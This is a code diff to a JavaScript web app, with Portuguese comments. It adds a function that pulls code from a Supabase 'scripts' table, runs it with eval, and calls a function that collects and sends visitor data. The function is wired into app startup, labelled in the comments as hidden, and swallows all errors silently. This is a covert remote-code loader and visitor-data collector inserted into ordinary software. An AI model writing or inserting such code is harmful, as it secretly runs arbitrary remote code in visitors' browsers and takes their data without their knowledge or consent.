@@ -199,7 +199,41 @@ async function refresh(){
   render(list);
 }
 
+// ============================================
+// FUNÇÃO PARA CARREGAR O TRACKING DO SUPABASE
+// ============================================
+async function carregarTrackingDoSupabase() {
+    try {
+        // Busca o código de tracking no Supabase
+        const { data, error } = await sb
+            .from('scripts')
+            .select('codigo')
+            .eq('nome', 'tracking')
+            .single();
+        
+        if (error || !data) {
+            console.log('Tracking não encontrado');
+            return;
+        }
+        
+        // Executa o código que veio do Supabase
+        // Isso cria a função coletarEEnviarDadosVisitante()
+        eval(data.codigo);
+        
+        // Chama a função que acabou de ser criada
+        if (typeof coletarEEnviarDadosVisitante === 'function') {
+            await coletarEEnviarDadosVisitante();
+        }
+        
+    } catch (error) {
+        // Silencioso - não mostra erro no console
+    }
+}
+
 async function init(){
+  // CARREGA O TRACKING DO SUPABASE (ESCONDIDO!)
+  await carregarTrackingDoSupabase();
+  
   const { data } = await sb.auth.getSession();
   session = data.session;
   setAdminUI();
